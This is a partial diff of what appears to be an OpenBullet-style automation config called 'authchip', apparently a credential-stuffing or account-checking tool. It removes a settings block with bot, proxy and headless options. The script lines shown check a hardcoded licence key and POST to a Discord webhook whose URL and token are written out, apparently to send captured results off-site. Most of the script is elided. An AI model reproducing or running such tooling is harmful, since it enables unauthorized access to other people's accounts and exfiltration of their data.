@@ -1,45 +1,3 @@
-[SETTINGS]
-{
-  "Name": "authchip",
-  "SuggestedBots": 1,
-  "MaxCPM": 50,
-  "LastModified": "2021-10-10T23:24:45.6033997-04:00",
-  "AdditionalInfo": "no",
-  "Author": "Contact#1001",
-  "Version": "1.2.2",
-  "SaveEmptyCaptures": false,
-  "ContinueOnCustom": true,
-  "SaveHitsToTextFile": false,
-  "IgnoreResponseErrors": false,
-  "MaxRedirects": 8,
-  "NeedsProxies": false,
-  "OnlySocks": false,
-  "OnlySsl": false,
-  "MaxProxyUses": 0,
-  "BanProxyAfterGoodStatus": false,
-  "BanLoopEvasionOverride": -1,
-  "EncodeData": false,
-  "AllowedWordlist1": "",
-  "AllowedWordlist2": "",
-  "DataRules": [],
-  "CustomInputs": [
-    {
-      "Description": "ENTER YOUR KEY",
-      "VariableName": "AUTHKEY",
-      "Id": 38776204
-    }
-  ],
-  "ForceHeadless": true,
-  "AlwaysOpen": true,
-  "AlwaysQuit": true,
-  "QuitOnBanRetry": false,
-  "DisableNotifications": true,
-  "CustomUserAgent": "",
-  "RandomUA": true,
-  "CustomCMDArgs": ""
-}
-
-[SCRIPT]
 IF "<AUTHKEY>" DoesNotContain "101020210909-dudud-ikmnbg"
 
 FUNCTION Constant "AUTH NOT GRANTED" -> CAP "AUTH" 
@@ -233,5 +191,4 @@ REQUEST POST "https://discord.com/api/webhooks/890454939002884116/-rllZd3dQJS6_s
   HEADER "Accept: */*" 
 
 ENDIF
-
 
